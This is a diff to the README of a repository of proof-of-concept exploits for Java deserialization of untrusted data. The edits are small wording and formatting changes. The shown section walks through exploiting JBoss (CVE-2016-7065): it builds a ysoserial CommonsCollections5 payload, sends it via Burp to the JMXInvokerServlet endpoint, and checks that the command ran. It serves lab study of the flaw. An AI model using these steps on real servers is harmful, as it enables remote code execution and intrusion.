@@ -1,6 +1,6 @@
-Here there are practical examples of the - deserialization of untrusted objects - vulnerability.
+Here there are practical examples of the - deserialization of untrusted data - vulnerability.
 
-These PoCs use the [ysoserial](https://github.com/frohoff/ysoserial/) tool to generate exploits.
+These pocs use the [ysoserial](https://github.com/frohoff/ysoserial/) tool to generate exploits.
 
 # Pocs
 
@@ -27,7 +27,7 @@ JBOSS (CVE-2016-7065)
 - Run jboss: ```java -jar ./JBoss/jboss-5.1.0.GA/bin/run.jar```
 - Download and open Burp: setup your proxy on localhost:9090
 - In your browser start proxy on localhost:9090
-- Generate the payload with ysoserial: java -jar ysoserial.jar CommonsCollections5 "touch /tmp/JbossVulnerable.txt" > JbossPayload.ser or use the payload inside the folder JBoss
+- Generate the payload with ysoserial: ```java -jar ysoserial.jar CommonsCollections5 "touch /tmp/JbossVulnerable.txt" > JbossPayload.ser``` or use the payload inside the folder JBoss
 - Open localhost:8080/invoker/JMXInvokerServlet
 - In Burp "paste from file" and choose JbossPayload.ser
 - Checkout in /tmp folder the execution of "touch /tmp/JbossVulnerable.txt"
